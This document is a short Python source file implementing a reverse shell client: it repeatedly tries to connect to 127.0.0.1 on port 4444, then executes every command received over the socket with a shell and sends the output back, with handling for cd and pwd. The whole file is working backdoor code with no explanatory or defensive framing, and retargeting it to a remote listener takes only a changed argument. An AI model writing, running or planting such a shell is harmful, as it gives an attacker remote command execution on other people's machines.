import os
import sys
import socket
import subprocess as sp


def handle(s):
    while True:
        try:
            data = s.recv(4096)
            print(data.decode())
            if not data: break

            data2 = data.decode("utf-8")

            if data2.startswith("cd"):
                path = data2[3:]
                os.chdir(path)
            elif data2 == "getcwd" or data2 == "pwd":
                s.sendall(os.getcwd().replace("\\\\", "\\").encode())

            spe = sp.run(data.decode("utf-8"),
                         shell=True,
                         stdout=sp.PIPE,
                         stderr=sp.PIPE)
            output_spe = spe.stdout + spe.stderr
            if output_spe == b'':
                s.sendall("Output None".encode())
            else:
                s.sendall(output_spe)

        except Exception as e:
            s.send(str(e).encode())

def connect(host, port):
    s = socket.socket()
    refused = 0
    while True:
        try:
            s.connect((host, port))
        except ConnectionRefusedError:
            refused += 1
            print(f"Connection refused ( {refused} )", end="\r")
        except OSError as e:
            if e.args[0] == 10056:
                continue
        else:
            print("Connection established!!")
            handle(s)

connect("127.0.0.1", 4444)